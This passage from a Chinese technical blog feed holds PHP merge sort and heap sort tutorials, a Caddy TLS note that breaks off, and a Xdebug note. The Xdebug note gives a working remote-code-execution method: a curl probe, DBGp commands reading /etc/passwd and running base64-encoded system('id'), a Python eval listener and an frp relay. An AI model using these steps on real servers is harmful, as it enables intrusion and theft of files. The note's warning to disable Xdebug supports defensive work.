++&lt;span style="color:#00688b">$j&lt;/span>;
}
}
&lt;span style="color:#8b008b;font-weight:bold">while&lt;/span>(&lt;span style="color:#00688b">$i&lt;/span> &amp;lt;= &lt;span style="color:#00688b">$mid&lt;/span>) {
&lt;span style="color:#00688b">$temp&lt;/span>[] = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>];
++&lt;span style="color:#00688b">$i&lt;/span>;
}
&lt;span style="color:#8b008b;font-weight:bold">while&lt;/span>(&lt;span style="color:#00688b">$j&lt;/span> &amp;lt;= &lt;span style="color:#00688b">$end&lt;/span>) {
&lt;span style="color:#00688b">$temp&lt;/span>[] = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>];
++&lt;span style="color:#00688b">$j&lt;/span>;
}
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span> (&lt;span style="color:#00688b">$k&lt;/span> = &lt;span style="color:#b452cd">0&lt;/span>; &lt;span style="color:#00688b">$k&lt;/span> &amp;lt; count(&lt;span style="color:#00688b">$temp&lt;/span>); ++&lt;span style="color:#00688b">$k&lt;/span>) {
&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$k&lt;/span> + &lt;span style="color:#00688b">$start&lt;/span>] = &lt;span style="color:#00688b">$temp&lt;/span>[&lt;span style="color:#00688b">$k&lt;/span>];
}
}
&lt;span style="color:#00688b">$arr&lt;/span> = [&lt;span style="color:#b452cd">38&lt;/span>, &lt;span style="color:#b452cd">19&lt;/span>, &lt;span style="color:#b452cd">29&lt;/span>, &lt;span style="color:#b452cd">91&lt;/span>, &lt;span style="color:#b452cd">85&lt;/span>, &lt;span style="color:#b452cd">12&lt;/span>, &lt;span style="color:#b452cd">41&lt;/span>, &lt;span style="color:#b452cd">21&lt;/span>];
mergeSort(&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#b452cd">0&lt;/span>, count(&lt;span style="color:#00688b">$arr&lt;/span>) - &lt;span style="color:#b452cd">1&lt;/span>);
print_r(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="5-效率分析">5 效率分析&lt;/h2>
&lt;p>1、时间复杂度：O(nlogn)
最好情况、最坏情况和平均时间复杂度均为O(nlogn);
2、空间复杂度：O(n)
算法处理过程中，需要一个大小为 n 的临时存储空间保存合并序列，所以空间复杂度为O(n)。
3、稳定性：稳定
在归并排序中，相等的元素的顺序不会改变，所以它是稳定排序。&lt;/p></description></item><item><title>Docs: 06-堆排序</title><link>https://note.codiy.net/docs/2020/04/06-%E5%A0%86%E6%8E%92%E5%BA%8F/</link><pubDate>Wed, 22 Apr 2020 22:23:21 +0800</pubDate><guid>https://note.codiy.net/docs/2020/04/06-%E5%A0%86%E6%8E%92%E5%BA%8F/</guid><description>
&lt;h2 id="0-堆的定义">0 堆的定义&lt;/h2>
&lt;p>堆通常是一个可以被看做一棵树的数组对象，其任一非叶节点满足以下性质：
1、堆中某个节点的值总是不大于或不小于其父节点的值：
　　每个节点的值都大于或等于其左右子节点的值，称为大顶堆。即：arr[i] &amp;gt;= arr[2i+1] &amp;amp;&amp;amp; arr[i] &amp;gt;= arr[2i+2]。
　　或：
　　每个节点的值都小于或等于其左右子节点的值，称为小顶堆。即：arr[i] &amp;lt;= arr[2i+1] &amp;amp;&amp;amp; arr[i] &amp;lt;= arr[2i+2]。
2、堆总是一棵完全二叉树。
&lt;code>注：上述公式，根节点从0开始。如果根节点从1开始，则左右子节点分别是2i和2i+1。&lt;/code>&lt;/p>
&lt;h2 id="1-基本思想">1 基本思想&lt;/h2>
&lt;p>以大顶堆为例，将待排序的序列构造成一个大顶堆，此时，整个序列的最大值就是堆顶的根节点。将它移走（也就是将其与堆数组的末尾元素交换，此时末尾元素就是最大值），然后将剩余的n-1个序列重新构造成一个堆，这样就会得到n个元素中的次小的值。如此反复执行，便能得到一个有序序列了。&lt;/p>
&lt;h2 id="2-算法过程">2 算法过程&lt;/h2>
&lt;p>1、将无需序列构建成一个堆，根据升序降序需求选择大顶堆或小顶堆;
2、将堆顶元素与末尾元素交换，将最大元素&amp;quot;沉&amp;quot;到数组末端;
3、重新调整结构，使其满足堆定义，然后继续交换堆顶元素与当前末尾元素，反复执行调整+交换步骤，直到整个序列有序。&lt;/p>
&lt;h2 id="3-算法图解">3 算法图解&lt;/h2>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/algorithm/2020-04/heap.gif"
alt="算法图解"
/>
&lt;/p>&lt;/p>
&lt;h2 id="4-php代码实现">4 PHP代码实现&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#cd5555">/**
&lt;/span>&lt;span style="color:#cd5555"> * 堆排序: 将元素看成完全二叉树, 先从(n/2-1)号元素到0号元素调整为大顶堆, 然后交换首尾值, 继续从0号元素调整
&lt;/span>&lt;span style="color:#cd5555"> * 时间复杂度: O(nlogn)
&lt;/span>&lt;span style="color:#cd5555"> * 空间复杂度: O(1)
&lt;/span>&lt;span style="color:#cd5555"> * 不稳定排序
&lt;/span>&lt;span style="color:#cd5555"> */&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">heapSort&lt;/span>(&amp;amp;&lt;span style="color:#00688b">$arr&lt;/span>) {
&lt;span style="color:#00688b">$length&lt;/span> = count(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;span style="color:#228b22">// 调整为大顶堆
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$i&lt;/span> = floor(&lt;span style="color:#00688b">$length&lt;/span>/&lt;span style="color:#b452cd">2&lt;/span> -&lt;span style="color:#b452cd">1&lt;/span>); &lt;span style="color:#00688b">$i&lt;/span> &amp;gt;= &lt;span style="color:#b452cd">0&lt;/span>; --&lt;span style="color:#00688b">$i&lt;/span>) {
adjustHeap(&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#00688b">$i&lt;/span>, &lt;span style="color:#00688b">$length&lt;/span>);
}
&lt;span style="color:#228b22">// 循环交换首尾元素并调整为大顶堆, 直到所有元素有序
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$j&lt;/span> = &lt;span style="color:#00688b">$length&lt;/span> - &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#00688b">$j&lt;/span> &amp;gt;= &lt;span style="color:#b452cd">0&lt;/span>; --&lt;span style="color:#00688b">$j&lt;/span>) {
&lt;span style="color:#8b008b;font-weight:bold">list&lt;/span>(&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#b452cd">0&lt;/span>], &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>]) = [&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>], &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#b452cd">0&lt;/span>]];
adjustHeap(&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#b452cd">0&lt;/span>, &lt;span style="color:#00688b">$j&lt;/span>);
}
}
&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">adjustHeap&lt;/span>(&amp;amp;&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#00688b">$i&lt;/span>, &lt;span style="color:#00688b">$length&lt;/span>) {
&lt;span style="color:#00688b">$temp&lt;/span> = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>];
&lt;span style="color:#228b22">// 从当前元素开始遍历左右子节点, 默认从左子节点开始遍历
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$j&lt;/span> = &lt;span style="color:#b452cd">2&lt;/span> * &lt;span style="color:#00688b">$i&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#00688b">$j&lt;/span> &amp;lt; &lt;span style="color:#00688b">$length&lt;/span>; &lt;span style="color:#00688b">$j&lt;/span> = &lt;span style="color:#b452cd">2&lt;/span> * &lt;span style="color:#00688b">$j&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>) {
&lt;span style="color:#228b22">// 如果右子节点比左子节点大,则遍历右子树
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$j&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span> &amp;lt; &lt;span style="color:#00688b">$length&lt;/span> &amp;amp;&amp;amp; &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>] &amp;lt; &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>]) {
&lt;span style="color:#00688b">$j&lt;/span>++;
}
&lt;span style="color:#228b22">// 如果当前遍历元素比当前所在子树的根大, 则将其父节点设为当前遍历元素的值
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>] &amp;gt; &lt;span style="color:#00688b">$temp&lt;/span>) {
&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>] = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>];
&lt;span style="color:#00688b">$i&lt;/span> = &lt;span style="color:#00688b">$j&lt;/span>;
}
}
&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>] = &lt;span style="color:#00688b">$temp&lt;/span>;
}
&lt;span style="color:#00688b">$arr&lt;/span> = [&lt;span style="color:#b452cd">38&lt;/span>, &lt;span style="color:#b452cd">19&lt;/span>, &lt;span style="color:#b452cd">29&lt;/span>, &lt;span style="color:#b452cd">91&lt;/span>, &lt;span style="color:#b452cd">85&lt;/span>, &lt;span style="color:#b452cd">12&lt;/span>, &lt;span style="color:#b452cd">41&lt;/span>, &lt;span style="color:#b452cd">21&lt;/span>];
heapSort(&lt;span style="color:#00688b">$arr&lt;/span>);
print_r(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="5-效率分析">5 效率分析&lt;/h2>
&lt;p>1、时间复杂度：O(nlogn)
最坏，最好，平均时间复杂度均为O(nlogn)。
2、空间复杂度：堆排序仅需一个记录大小的供交换用的辅助存储空间，因此空间复杂度为O(1)，是不稳定排序。&lt;/p></description></item><item><title>Docs: Php Xdebug</title><link>https://note.codiy.net/docs/2022/01/php-xdebug/</link><pubDate>Tue, 18 Jan 2022 10:41:58 +0800</pubDate><guid>https://note.codiy.net/docs/2022/01/php-xdebug/</guid><description>
&lt;blockquote>
&lt;p>温馨提示: &lt;strong>放置到公网的 PHP 环境，请务必关闭 Xdebug.&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;h2 id="xdebug-调试-php">Xdebug 调试 PHP&lt;/h2>
&lt;ul>
&lt;li>配置 &lt;a href="https://xdebug.org/docs/all_settings#mode">&lt;code>xdbeug.mode&lt;/code>&lt;/a> 可设置 xdebug 开启的模式.&lt;/li>
&lt;li>配置 &lt;a href="https://xdebug.org/docs/all_settings#start_with_request">&lt;code>xdebug.start_with_request&lt;/code>&lt;/a> 可通过设置请求参数 &lt;code>XDEBUG_SESSION_START=phpstrom&lt;/code> 或者设置环境变量
&lt;code>XDEBUG_SESSION=1&lt;/code> 或者设置请求头信息 &lt;code>Cookie: XDEBUG_SESSION=start&lt;/code> 等方式开启 xdebug&lt;/li>
&lt;li>配置 &lt;a href="https://xdebug.org/docs/all_settings#discover_client_host">&lt;code>xdebug.discover_client_host&lt;/code>&lt;/a>, 支持通过 &lt;code>X-Forwarded-For&lt;/code> 头信息获取调试客户端的地址&lt;/li>
&lt;li>配置 &lt;code>xdebug.client_host&lt;/code>, &lt;code>xdebug.client_port&lt;/code> 指定调试客户端的地址和端口&lt;/li>
&lt;li>Xdebug 支持 &lt;a href="https://xdebug.org/docs/dbgp">&lt;code>dbgp 调试协议&lt;/code>&lt;/a>, 可以用来进行&lt;strong>源码阅读&lt;/strong>, &lt;strong>执行 eval 指令&lt;/strong>, &lt;strong>开启交互式 shell&lt;/strong> 等危险操作&lt;/li>
&lt;li>Xdebug 的一般配置&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#658b00">zend_extension&lt;/span>=&lt;span style="color:#cd5555">xdebug.so&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">[xdebug]&lt;/span>
&lt;span style="color:#658b00">xdebug.mode&lt;/span>=&lt;span style="color:#cd5555">debug&lt;/span>
&lt;span style="color:#658b00">xdebug.start_with_request&lt;/span>=&lt;span style="color:#cd5555">trigger ; start only XDEBUG_SESSION or XDEBUG_TRIGGER environment varibale is set&lt;/span>
&lt;span style="color:#658b00">xdebug.discover_client_host&lt;/span>=&lt;span style="color:#cd5555">yes&lt;/span>
&lt;span style="color:#658b00">xdebug.client_host&lt;/span>=&lt;span style="color:#cd5555">host.docker.internal&lt;/span>
&lt;span style="color:#658b00">xdebug.client_port&lt;/span>=&lt;span style="color:#cd5555">9000&lt;/span>
&lt;span style="color:#658b00">xdebug.idekey&lt;/span>=&lt;span style="color:#cd5555">VSCODE&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="xdebug-dbgp-协议">Xdebug DBGp 协议&lt;/h2>
&lt;p>通过阅读 &lt;a href="https://xdebug.org/docs/dbgp">DBGp&lt;/a> 的文档，我们可以注意到一些比较敏感的命令。&lt;/p>
&lt;ul>
&lt;li>Core Commands &amp;gt; source&lt;/li>
&lt;li>Extended Commands &amp;gt; eval&lt;/li>
&lt;li>Extended Commands &amp;gt; interact - Interactive Shell&lt;/li>
&lt;li>Core Commands &amp;gt; property_set&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>1. &lt;code>source -i transaction_id -f FILE_URI&lt;/code>&lt;/strong>&lt;/p>
&lt;p>&lt;code>transaction_id&lt;/code> 貌似没有那么硬性的要求，每次都为 1 即可 FILE_URI 是要读取的文件的路径，需要注意的是
Xdebug 也受限于 &lt;code>open_basedir&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>source -i 1 -f file:///etc/passwd
&lt;/code>&lt;/pre>&lt;p>此处也可以用 &lt;code>php://PHP_SCRIPT_LOCATION&lt;/code> 来读取文件, 因而也可能用来发起 &lt;strong>SSRF&lt;/strong> 攻击&lt;/p>
&lt;p>&lt;strong>2. &lt;code>eval -i transaction_id -- {DATA}&lt;/code>&lt;/strong>&lt;/p>
&lt;p>&lt;code>{DATA}&lt;/code> 为 base64 过的 PHP 代码。&lt;/p>
&lt;p>&lt;strong>3. interact&lt;/strong>&lt;/p>
&lt;p>暂未研究&lt;/p>
&lt;p>&lt;strong>4. property_set&lt;/strong>&lt;/p>
&lt;p>根据 Xdebug 实现的 dbgp 协议, property_set 存在一处执行 evel 命令的入口, 详见源码 &lt;a href="https://github.com/xdebug/xdebug/blob/master/src/debugger/handler_dbgp.c#L1628-L1630">handler_dbgp.c&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#228b22">/* Do the eval */&lt;/span>
eval_string = xdebug_sprintf(&lt;span style="color:#cd5555">&amp;#34;%s = %s %s&amp;#34;&lt;/span>, CMD_OPTION_CHAR(&lt;span style="color:#cd5555">&amp;#39;n&amp;#39;&lt;/span>), cast_as, new_value);
res = xdebug_do_eval(eval_string, &amp;amp;ret_zval);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>利用方式:&lt;/p>
&lt;pre tabindex="0">&lt;code>property_set -n $a -i 1 -c 1 -- c3lzdGVtKCJpZCIpOw==
property_get -n $a -i 1 -c 1 -p 0
&lt;/code>&lt;/pre>&lt;h2 id="服务器-xdebug-嗅探">服务器 Xdebug 嗅探&lt;/h2>
&lt;p>通过一条 &lt;strong>CURL&lt;/strong> 指令即可嗅探目标服务器是否开启了 &lt;strong>Xdebug&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -v &lt;span style="color:#cd5555">&amp;#34;http://&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">TARGET_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">/?XDEBUG_SESSION_START=phpstrom&amp;#34;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;X-Forwarded-For: &lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">XDEBUG_CLIENT_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;Cookie: XDEBUG_SESSION=start&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>原理简介:&lt;/strong> 服务器端开启了 Xdebug 在收到请求时, 发现请求携带了 &lt;code>XDEBUG_SESSION_START&lt;/code> 参数或者 &lt;code>Cookie: XDEBUG_SESSION=start&lt;/code>
头信息, 会尝试用 &lt;code>X-Forwarded-For&lt;/code> 所指定的地址作为 Xdebug 的远端(xdebug client), 向其发起连接, 连接的端口为 &lt;code>xdebug.client_port&lt;/code>
设置的值.&lt;/p>
&lt;h2 id="配置-xdebug-client">配置 Xdebug Client&lt;/h2>
&lt;p>即用来与目标机器 xdebug 交互的 client.&lt;/p>
&lt;h3 id="方式一-简单的通过-nc-命令-监听常见的-xdebug-client-端口-9000-9003">方式一: 简单的通过 &lt;strong>&lt;code>nc&lt;/code>&lt;/strong> 命令, 监听常见的 xdebug client 端口 &lt;strong>&lt;code>9000&lt;/code>&lt;/strong>, &lt;strong>&lt;code>9003&lt;/code>&lt;/strong>&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">nc -lvv &lt;span style="color:#b452cd">9000&lt;/span>
nc -lvv &lt;span style="color:#b452cd">9003&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行 &lt;strong>CURL&lt;/strong> 嗅探请求, 当 &lt;strong>nc&lt;/strong> 回显出类似如下的 xml 文档，即说明目标机器 xdebug 处于可利用状态.
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/uncataloged/2022-01/18131632.png"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="方式二-利用脚本文件-实现当-xdebug-与-client-建立连接后-client-交互式的发送指令给目标机器">方式二: 利用脚本文件, 实现当 xdebug 与 client 建立连接后, client 交互式的发送指令给目标机器&lt;/h3>
&lt;p>xdebug.py&lt;/p>
&lt;pre tabindex="0">&lt;code>#!/usr/bin/python3
import socket
import base64
ip_port = ('0.0.0.0',9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()
while True:
client_data = conn.recv(1024)
print(&amp;quot;&amp;lt;&amp;lt;\n&amp;quot;)
print(client_data)
print(&amp;quot;\n&amp;quot;)
data = input('&amp;gt;&amp;gt; ')
data = base64.b64encode(data.encode('utf-8'))
print('eval -i 1 -- %s\x00' % data.decode('utf-8'))
conn.sendall(('eval -i 1 -- %s\x00' % data.decode('utf-8')).encode('utf-8'))
&lt;/code>&lt;/pre>&lt;h3 id="利用-gofrp6-实现将本机作为-xdebug-client-方便调试">利用 &lt;strong>&lt;a href="https://github.com/fatedier/frp">gofrp&lt;/a>&lt;/strong> 实现将本机作为 &lt;strong>xdebug client&lt;/strong>, 方便调试&lt;/h3>
&lt;p>frps.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#228b22">; frps.ini&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">[common]&lt;/span>
&lt;span style="color:#658b00">bind_port&lt;/span> = &lt;span style="color:#cd5555">7000&lt;/span>
&lt;span style="color:#658b00">kcp_bind_port&lt;/span> = &lt;span style="color:#cd5555">7000&lt;/span>
&lt;span style="color:#658b00">token&lt;/span> = &lt;span style="color:#cd5555">whatthefuck&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>fprc.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#228b22">; frpc.ini&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">[common]&lt;/span>
&lt;span style="color:#658b00">server_addr&lt;/span> = &lt;span style="color:#cd5555">xxx.xxx.xxx.xxx&lt;/span>
&lt;span style="color:#658b00">server_port&lt;/span> = &lt;span style="color:#cd5555">7000&lt;/span>
&lt;span style="color:#658b00">token&lt;/span> = &lt;span style="color:#cd5555">whatthefuck&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">[tcp_9000]&lt;/span>
&lt;span style="color:#658b00">type&lt;/span> = &lt;span style="color:#cd5555">tcp&lt;/span>
&lt;span style="color:#658b00">local_port&lt;/span> = &lt;span style="color:#cd5555">9000&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">[tcp_9003]&lt;/span>
&lt;span style="color:#658b00">type&lt;/span> = &lt;span style="color:#cd5555">tcp&lt;/span>
&lt;span style="color:#658b00">local_port&lt;/span> = &lt;span style="color:#cd5555">9003&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>运行命令启动 client&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>python3 xdebug.py
frpc -c ./frpc.ini
&lt;/code>&lt;/pre>&lt;p>接着即可用 &lt;strong>CURL&lt;/strong> 嗅探指令来建立 xdebug 连接, 注意 &lt;code>X-Forwarded-For&lt;/code> 应当指定为 &lt;strong>frps&lt;/strong> 服务器地址&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -v &lt;span style="color:#cd5555">&amp;#34;http://&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">TARGET_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">/?XDEBUG_SESSION_START=phpstrom&amp;#34;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;X-Forwarded-For: &lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">FRPS_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;Cookie: XDEBUG_SESSION=start&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Docs: Caddy Usage</title><link>https://note.codiy.net/docs/2022/01/caddy-usage/</link><pubDate>Sun, 16 Jan 2022 11:59:15 +0800</pubDate><guid>https://note.codiy.net/docs/2022/01/caddy-usage/</guid><description>
&lt;h2 id="build-your-own-caddy-images">Build your own caddy images&lt;/h2>
&lt;p>Dockerfile:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Dockerfile" data-lang="Dockerfile">&lt;span style="color:#8b008b;font-weight:bold">FROM&lt;/span>&lt;span style="color:#cd5555"> caddy:builder AS builder&lt;/span>&lt;span style="color:#a61717;background-color:#e3d2d2">
&lt;/span>&lt;span style="color:#a61717;background-color:#e3d2d2">
&lt;/span>&lt;span style="color:#a61717;background-color:#e3d2d2">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">RUN&lt;/span> xcaddy build &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> --with github.com/caddy-dns/alidns&lt;span style="color:#a61717;background-color:#e3d2d2">
&lt;/span>&lt;span style="color:#a61717;background-color:#e3d2d2">
&lt;/span>&lt;span style="color:#a61717;background-color:#e3d2d2">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">FROM&lt;/span>&lt;span style="color:#cd5555"> caddy&lt;/span>&lt;span style="color:#a61717;background-color:#e3d2d2">
&lt;/span>&lt;span style="color:#a61717;background-color:#e3d2d2">
&lt;/span>&lt;span style="color:#a61717;background-color:#e3d2d2">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">COPY&lt;/span> --from=builder /usr/bin/caddy /usr/bin/caddy&lt;span style="color:#a61717;background-color:#e3d2d2">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="caddy-tls-settings">Caddy TLS Settings&lt;/h2>
&lt;p>&lt;strong>&lt;a href="https://caddyserver.com/docs/caddyfile/directives/tls">Caddyfile Syntax&lt;/a>&lt;/strong>:&lt;/p>
&lt;pre tabindex="0">&lt;code>tls [internal|&amp;lt;email&amp;gt;] | [&amp;lt;cert_file&amp;gt; &amp;lt;key_file&amp;gt;] {
protocols &amp;lt;min&amp;gt; [&amp;lt;max&amp;gt;]
ciphers &amp;lt;cipher_suites...&amp;gt;
curves &amp;lt;curves...&amp;gt;
alpn &amp;lt;values...&amp;gt;
load &amp;lt;paths...&amp;gt;
ca &amp;lt;ca_dir_url&amp;gt;
ca_root &amp;lt;pem_file&amp;gt;
key_type ed25519|p256|p384|rsa2048|rsa4096
dns &amp;lt;provider_name&amp;gt; [&amp;lt;params...&amp;gt;]
resolvers &amp;lt;dns_servers...&amp;gt;
eab &amp;lt;key_id&amp;gt; &amp;lt;mac_key&amp;gt;
on_demand
client_auth {
mode [request|require|verify_if_given|require_and_verify]
trusted_ca_cert &amp;lt;base64_der&amp;gt;
trusted_ca_cert_file &amp;lt;filename&amp;gt;
trusted_leaf_cert &amp;lt;base64_der&amp;gt;
trusted_leaf_cert_file &amp;lt;filename&amp;gt;
}
issuer &amp;lt;issuer_name&amp;gt; [&amp;lt;params...&amp;gt;]
}
&lt;/code>&lt;/pre>&lt;h3 id="常见配置方式">常见配置方式&lt;/h3>
&lt;p>&lt;a href="https://caddyserver.com/docs/automatic-https">Caddy Automatic Https&lt;/a>&lt;/p>
&lt;p>&lt;strong>1. 使用内置的 CA 颁发自签证书&lt;/strong>&lt;/p>
&lt;p>可能需要根据提示输入主机密码来将根证书安装到本机的信任库中&lt;/p>
&lt;p>&lt;strong>2. 直接指定证书位置&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>tls {$SSL_CERT_PATH} {$SSL_KEY_PATH}
&lt;/code>&lt;/pre>&lt;p>&lt;strong>3. 使用 letsencrypt 或 zerossl 来获得公共认可的 TLS 证书并自动续期&lt;/strong>&lt;/p>
&lt;p>免费版本的 letsencrypt, zerossl 证书有效期仅有 90 天, caddy 会在到期之前自动的更新证书. 根据 &lt;a href="https://datatracker.ietf.org/doc/html/rfc8555">ACME 协议&lt;/a>
有以下三种常见方式来验证域名&lt;/p>
&lt;ul>
&lt;li>HTTP-01&lt;/li>
&lt;li>TLS-ALPN-01&lt;/li>
&lt;li>DNS-01&lt;/li>
&lt;/ul>
&lt;p>详细说明见 &lt;a href="https://letsencrypt.org/docs/challenge-types/">Challenge Types&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>值得注意的是 ACME 协议和 letsencrypt, zerossl 只使用标准的 http, https, dns 端口(即 80, 443, 53) 来验证&lt;br>
域名. 对于家庭网络公有IP的 &lt;code>80, 443&lt;/code> 端口可能被运营商默认屏蔽, 因此无法在家庭网络中正常的使用 &lt;code>http-01&lt;/code> 和 &lt;code>tls-alpn-01&lt;/code> 方式验证域名&lt;/p>
&lt;/blockquote>
&lt;p>对于 &lt;code>DNS-01&lt;/code> Chanllege, Caddy 提供了一系列的模块来支持 DNS 验证, 比如 &lt;code>route53&lt;/code>, &lt;code>alidns&lt;/code>, &lt;code>cloudflare&lt;/code> 等,
详见&lt;a href="https://github.com/caddy-dns?type=source">Caddy Dns Modules&lt;/a>&lt;/p>
&lt;h2 id="caddyfile-examples">Caddyfile Examples&lt;/h2>
&lt;h3 id="caddy-work-with-vaultwardenuse-dns-01-chanllege">Caddy work with Vaultwarden(Use &lt;code>DNS-01&lt;/code> Chanllege)&lt;/h3>
&lt;p>docker-compose.yaml&lt;/p>
